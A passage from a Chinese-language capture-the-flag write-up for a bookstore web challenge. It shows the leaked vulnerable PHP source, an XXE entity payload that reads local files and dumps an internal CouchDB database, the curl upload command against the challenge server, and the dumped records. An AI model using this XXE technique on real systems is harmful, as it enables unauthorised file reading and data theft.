</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;src-url&gt;</span>http://www.vavilon.ru/noragal/pp/<span style=color:#ff79c6>&lt;/src-url&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;src-ocr&gt;</span>Справочная Служба Русского Языка<span style=color:#ff79c6>&lt;/src-ocr&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;id&gt;</span>0CB33702-6AE9-4377-9AFA-3BA2EF2F37F6<span style=color:#ff79c6>&lt;/id&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;version&gt;</span>1.2<span style=color:#ff79c6>&lt;/version&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;history&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;p&gt;</span>v 1.1 — дополнительное форматирование — Faiber<span style=color:#ff79c6>&lt;/p&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;p&gt;</span>v 1.2 — изменена обложка — Faiber<span style=color:#ff79c6>&lt;/p&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;/history&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/document-info&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;publish-info&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;book-name&gt;</span>Маленький Принц<span style=color:#ff79c6>&lt;/book-name&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;city&gt;</span>Фрунзе<span style=color:#ff79c6>&lt;/city&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;year&gt;</span>1982<span style=color:#ff79c6>&lt;/year&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/publish-info&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;custom-info</span> <span style=color:#50fa7b>info-type=</span><span style=color:#f1fa8c>&#34;general&#34;</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/description&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;body&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;title&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;p&gt;</span>Антуан де Сент-Экзюпери<span style=color:#ff79c6>&lt;/p&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;empty-line</span> <span style=color:#ff79c6>/&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&lt;p&gt;</span>Маленький принц<span style=color:#ff79c6>&lt;/p&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/title&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;section&gt;</span>
</span></span><span style=display:flex><span>            123
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;/section&gt;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/FictionBook&gt;</span>
</span></span></code></pre></div><p>然后利用 xxe, 就能读文件了, 这里各种尝试, fuzz 出来 <code>/proc/self/cwd/index.php</code>, 可以直接读到源码.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span>error_reporting(<span style=color:#ff79c6>E_ALL</span>);
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>save2db</span>(<span style=color:#8be9fd;font-style:italic>$data</span>) {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$headers</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>array</span>(
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#34;Content-type: application/json&#34;</span>,
</span></span><span style=display:flex><span>        );
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> json_encode(<span style=color:#8be9fd;font-style:italic>$data</span>);
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$myCurl</span> <span style=color:#ff79c6>=</span> curl_init();
</span></span><span style=display:flex><span>        curl_setopt_array(<span style=color:#8be9fd;font-style:italic>$myCurl</span>, <span style=color:#ff79c6>array</span>(
</span></span><span style=display:flex><span>            CURLOPT_URL <span style=color:#ff79c6>=&gt;</span> <span style=color:#f1fa8c>&#39;http://127.0.0.1:5984/library&#39;</span>,
</span></span><span style=display:flex><span>            CURLOPT_RETURNTRANSFER <span style=color:#ff79c6>=&gt;</span> <span style=color:#ff79c6>true</span>,
</span></span><span style=display:flex><span>            CURLOPT_HTTPHEADER <span style=color:#ff79c6>=&gt;</span> <span style=color:#8be9fd;font-style:italic>$headers</span>,
</span></span><span style=display:flex><span>            CURLOPT_ENCODING <span style=color:#ff79c6>=&gt;</span> <span style=color:#f1fa8c>&#39;gzip,deflate&#39;</span>,
</span></span><span style=display:flex><span>            CURLOPT_POST <span style=color:#ff79c6>=&gt;</span> <span style=color:#ff79c6>true</span>,
</span></span><span style=display:flex><span>            CURLOPT_POSTFIELDS <span style=color:#ff79c6>=&gt;</span> <span style=color:#8be9fd;font-style:italic>$data</span>
</span></span><span style=display:flex><span>        ));
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$response</span> <span style=color:#ff79c6>=</span> curl_exec(<span style=color:#8be9fd;font-style:italic>$myCurl</span>);
</span></span><span style=display:flex><span>        curl_close(<span style=color:#8be9fd;font-style:italic>$myCurl</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>$response</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>process</span>(<span style=color:#8be9fd;font-style:italic>$xmlfile</span>) {
</span></span><span style=display:flex><span>        libxml_disable_entity_loader (<span style=color:#ff79c6>false</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$dom</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> DOMDocument();
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$dom</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>loadXML</span>(<span style=color:#8be9fd;font-style:italic>$xmlfile</span>, LIBXML_NOENT);
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$creds</span> <span style=color:#ff79c6>=</span> simplexml_import_dom(<span style=color:#8be9fd;font-style:italic>$dom</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>isset(<span style=color:#8be9fd;font-style:italic>$creds</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>description</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Description not found&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>isset(<span style=color:#8be9fd;font-style:italic>$creds</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>description</span><span style=color:#ff79c6>-&gt;</span>{<span style=color:#f1fa8c>&#39;title-info&#39;</span>})) {
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Title info not found&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$titleinfo</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$creds</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>description</span><span style=color:#ff79c6>-&gt;</span>{<span style=color:#f1fa8c>&#39;title-info&#39;</span>};
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>foreach</span> ([<span style=color:#f1fa8c>&#39;genre&#39;</span>, <span style=color:#f1fa8c>&#39;author&#39;</span>, <span style=color:#f1fa8c>&#39;book-title&#39;</span>, <span style=color:#f1fa8c>&#39;annotation&#39;</span>, <span style=color:#f1fa8c>&#39;date&#39;</span>, <span style=color:#f1fa8c>&#39;lang&#39;</span>] <span style=color:#ff79c6>as</span> <span style=color:#8be9fd;font-style:italic>$item</span>) {
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>property_exists(<span style=color:#8be9fd;font-style:italic>$titleinfo</span>, <span style=color:#8be9fd;font-style:italic>$item</span>)) {
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>$item</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34; not found&#34;</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        save2db([<span style=color:#f1fa8c>&#39;title&#39;</span> <span style=color:#ff79c6>=&gt;</span> base64_encode(<span style=color:#8be9fd;font-style:italic>$titleinfo</span><span style=color:#ff79c6>-&gt;</span>{<span style=color:#f1fa8c>&#39;book-title&#39;</span>}), <span style=color:#f1fa8c>&#39;date&#39;</span> <span style=color:#ff79c6>=&gt;</span> <span style=color:#8be9fd;font-style:italic>$titleinfo</span><span style=color:#ff79c6>-&gt;</span>{<span style=color:#f1fa8c>&#39;date&#39;</span>}, <span style=color:#f1fa8c>&#39;url&#39;</span> <span style=color:#ff79c6>=&gt;</span> bin2hex(random_bytes(<span style=color:#bd93f9>16</span>))]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>$titleinfo</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$results</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (isset(<span style=color:#8be9fd;font-style:italic>$_FILES</span>[<span style=color:#f1fa8c>&#34;newbook&#34;</span>])) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (<span style=color:#8be9fd;font-style:italic>$_FILES</span>[<span style=color:#f1fa8c>&#39;newbook&#39;</span>][<span style=color:#f1fa8c>&#39;error&#39;</span>] <span style=color:#ff79c6>==</span> UPLOAD_ERR_OK
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>&amp;&amp;</span> is_uploaded_file(<span style=color:#8be9fd;font-style:italic>$_FILES</span>[<span style=color:#f1fa8c>&#39;newbook&#39;</span>][<span style=color:#f1fa8c>&#39;tmp_name&#39;</span>])
</span></span><span style=display:flex><span>        ) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_FILES</span>[<span style=color:#f1fa8c>&#39;newbook&#39;</span>][<span style=color:#f1fa8c>&#39;tmp_name&#39;</span>];
</span></span><span style=display:flex><span>            exec(<span style=color:#f1fa8c>&#34;/var/www/main d &#34;</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34; &#34;</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34;.decoded&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>is_file(<span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34;.decoded&#34;</span>)) {
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>echo</span> <span style=color:#f1fa8c>&#34;Decoding ERROR&#34;</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> file_get_contents(<span style=color:#8be9fd;font-style:italic>$name</span> <span style=color:#ff79c6>.</span> <span style=color:#f1fa8c>&#34;.decoded&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> gzuncompress(<span style=color:#8be9fd;font-style:italic>$data</span>);
</span></span><span style=display:flex><span>                <span style=color:#8be9fd;font-style:italic>$results</span> <span style=color:#ff79c6>=</span> process(<span style=color:#8be9fd;font-style:italic>$data</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#ff79c6>?&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!doctype html&gt;
</span></span><span style=display:flex><span>&lt;html lang=&#34;en&#34;&gt;
</span></span><span style=display:flex><span>&lt;head&gt;
</span></span><span style=display:flex><span>    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span style=display:flex><span>    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;title&gt;New CyBRICS BookStore&lt;/title&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;!-- Bootstrap core CSS --&gt;
</span></span><span style=display:flex><span>    &lt;link href=&#34;../css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/head&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;body&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;div class=&#34;d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow&#34;&gt;
</span></span><span style=display:flex><span>    &lt;h5 class=&#34;my-0 mr-md-auto font-weight-normal&#34;&gt;CyBRICS BookStore&lt;/h5&gt;
</span></span><span style=display:flex><span>    &lt;nav class=&#34;my-2 my-md-0 mr-md-3&#34;&gt;
</span></span><span style=display:flex><span>        &lt;a class=&#34;p-2 text-dark&#34; href=&#34;#&#34;&gt;Authors zone&lt;/a&gt;
</span></span><span style=display:flex><span>    &lt;/nav&gt;
</span></span><span style=display:flex><span>    &lt;a class=&#34;btn btn-outline-primary&#34; href=&#34;#&#34;&gt;Sign up&lt;/a&gt;
</span></span><span style=display:flex><span>&lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;div class=&#34;pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center&#34;&gt;
</span></span><span style=display:flex><span>    &lt;h1 class=&#34;display-4&#34;&gt;Authors zone&lt;/h1&gt;
</span></span><span style=display:flex><span>    &lt;p class=&#34;lead&#34;&gt;Our site is under development, but you already can &lt;a href=&#34;&#34;&gt;download DRM&lt;/a&gt; and demo books&lt;/p&gt;
</span></span><span style=display:flex><span>&lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;div class=&#34;container&#34;&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;div&gt;
</span></span><span style=display:flex><span>        &lt;h2&gt;You can add your book&lt;/h2&gt;
</span></span><span style=display:flex><span>        &lt;div&gt;&lt;small&gt;* You will be further informed about review results&lt;/small&gt;&lt;/div&gt;
</span></span><span style=display:flex><span>        &lt;div&gt;
</span></span><span style=display:flex><span>            &lt;form enctype=&#34;multipart/form-data&#34; action=&#34;/authorszone/index.php&#34; method=&#34;POST&#34;&gt;
</span></span><span style=display:flex><span>                &lt;input type=&#34;file&#34; name=&#34;newbook&#34;&gt;
</span></span><span style=display:flex><span>                &lt;input type=&#34;submit&#34; value=&#34;Submit for review&#34;&gt;
</span></span><span style=display:flex><span>            &lt;/form&gt;
</span></span><span style=display:flex><span>        &lt;/div&gt;
</span></span><span style=display:flex><span>        &lt;div style=&#34;margin-top: 10px&#34;&gt;
</span></span><span style=display:flex><span>            &lt;table class=&#34;table table-striped&#34;&gt;
</span></span><span style=display:flex><span>            &lt;?php
</span></span><span style=display:flex><span>                if (is_object($results)) {
</span></span><span style=display:flex><span>                    echo &#34;&lt;h2&gt;Book is under review:&lt;/h2&gt;&#34;;
</span></span><span style=display:flex><span>                    foreach ([&#39;genre&#39;, &#39;author&#39;, &#39;book-title&#39;, &#39;annotation&#39;, &#39;date&#39;, &#39;lang&#39;] as $item) {
</span></span><span style=display:flex><span>                        echo &#34;&lt;tr&gt;&lt;td&gt;&#34;.$item.&#34;&lt;/td&gt;&lt;td&gt;&#34;.$results-&gt;{$item}-&gt;asXML().&#34;&lt;/td&gt;&lt;/tr&gt;&#34;;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                } else {
</span></span><span style=display:flex><span>                    echo $results;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            ?&gt;
</span></span><span style=display:flex><span>            &lt;/table&gt;
</span></span><span style=display:flex><span>        &lt;/div&gt;
</span></span><span style=display:flex><span>    &lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;footer class=&#34;pt-4 my-md-5 pt-md-5 border-top&#34;&gt;
</span></span><span style=display:flex><span>        &lt;div class=&#34;row&#34;&gt;
</span></span><span style=display:flex><span>            &lt;div class=&#34;col-12 col-md&#34;&gt;
</span></span><span style=display:flex><span>                &lt;img class=&#34;mb-2&#34; src=&#34;https://getbootstrap.com/assets/brand/bootstrap-solid.svg&#34; alt=&#34;&#34; width=&#34;24&#34; height=&#34;24&#34;&gt;
</span></span><span style=display:flex><span>                &lt;small class=&#34;d-block mb-3 text-muted&#34;&gt;&amp;copy; 2018&lt;/small&gt;
</span></span><span style=display:flex><span>            &lt;/div&gt;
</span></span><span style=display:flex><span>        &lt;/div&gt;
</span></span><span style=display:flex><span>    &lt;/footer&gt;
</span></span><span style=display:flex><span>&lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!-- Bootstrap core JavaScript
</span></span><span style=display:flex><span>================================================== --&gt;
</span></span><span style=display:flex><span>&lt;!-- Placed at the end of the document so the pages load faster --&gt;
</span></span><span style=display:flex><span>&lt;script src=&#34;https://code.jquery.com/jquery-3.2.1.slim.min.js&#34; integrity=&#34;sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN&#34; crossorigin=&#34;anonymous&#34;&gt;&lt;/script&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span><span style=display:flex><span>&lt;/html&gt;
</span></span></code></pre></div><p>可以看到为了绕过 libxml 自带的安全措施, 出题人也是煞费苦心 233.<br>在源码里面可以发现用了 <code>couchdb</code>, 好在支持 http 协议, 我们通过 http 访问 <code>couchdb</code> 的各种 API.<br>翻了翻文档, 可以发现用</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:5984/library/_changes?include_docs=true&#34; &gt;</span>]&gt;
</span></span></code></pre></div><p>就能直接脱裤 (比较大, 浏览器会卡死, 建议直接 curl 脱</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>curl <span style=color:#f1fa8c>&#39;http://45.77.219.97/authorszone/index.php&#39;</span> -H <span style=color:#f1fa8c>&#39;Cache-Control: max-age=0&#39;</span> -H <span style=color:#f1fa8c>&#39;Origin: http://45.77.219.97&#39;</span> -H <span style=color:#f1fa8c>&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style=color:#f1fa8c>&#39;DNT: 1&#39;</span>  -H <span style=color:#f1fa8c>&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#39;</span> -H <span style=color:#f1fa8c>&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#39;</span> -H <span style=color:#f1fa8c>&#39;Referer: http://45.77.219.97/authorszone/index.php&#39;</span> -F <span style=color:#f1fa8c>&#39;newbook=@evil.fb2enc&#39;</span> --compressed --insecure -vv -o asd2.html
</span></span></code></pre></div><p>得到</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{&#34;seq&#34;:1,&#34;id&#34;:&#34;648ed731593e7c015c96df3f21000a2b&#34;,&#34;changes&#34;:[{&#34;rev&#34;:&#34;1-d8bf4bb75eae1dd6117c8a59b952e27e&#34;}],&#34;doc&#34;:{&#34;_id&#34;:&#34;648ed731593e7c015c96df3f21000a2b&#34;,&#34;_rev&#34;:&#34;1-d8bf4bb75eae1dd6117c8a59b952e27e&#34;,&#34;title&#34;:&#34;Mona Lisa Overdrive&#34;,&#34;url&#34;:&#34;4cb21fe9786c74f0b83f1fa808e30e4d&#34;}},
</span></span><span style=display:flex><span>{&#34;seq&#34;:2,&#34;id&#34;:&#34;648ed731593e7c015c96df3f21000ac6&#34;,&#34;changes&#34;:[{&#34;rev&#34;:&#34;1-4802d0cdd11425ffcc9500b5f5db9a56&#34;}],&#34;doc&#34;:{&#34;_id&#34;:&#34;648ed731593e7c015c96df3f21000ac6&#34;,&#34;_rev&#34;:&#34;1-4802d0cdd11425ffcc9500b5f5db9a56&#34;,&#34;title&#34;:&#34;Small Prince&#34;,&#34;url&#34;:&#34;6506dad64d2353f25cca891f81443a8e&#34;}},
</span></span><span style=display:flex><span>{&#34;seq&#34;:3,&#34;id&#34;:&#34;648ed731593e7c015c96df3f21000ba3&#34;,&#34;changes&#34;:[{&#34;rev&#34;:&#34;1-094bdefdba07bc63ae11584c79c51909&#34;}],&#34;doc&#34;:{&#34;_id&#34;:&#34;648ed731593e7c015c96df3f21000ba3&#34;,&#34;_rev&#34;:&#34;1-094bdefdba07bc63ae11584c79c51909&#34;,&#34;title&#34;:&#34;Flag Book&#34;,&#34;url&#34;:&#34;3ba9318b509034cb7b506df0faef4d80&#34;}},
</span></span></code></pre></div><p>结合 url 的参数, 在 <code>http://45.77.219.97/books/3ba9318b509034cb7b506df0faef4d80.fb2enc</code> 就能下到 Flag Book 啦.<br>解密一下, 然后就可以找到在里面的 flag 一枚</p><p><img src=https://i.loli.net/2019/07/22/5d351ec06428750220.png alt></p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/writeup>writeup</a></li><li><a href=/tags/crypto>crypto</a></li><li><a href=/tags/web>web</a></li><li><a href=/tags/misc>misc</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>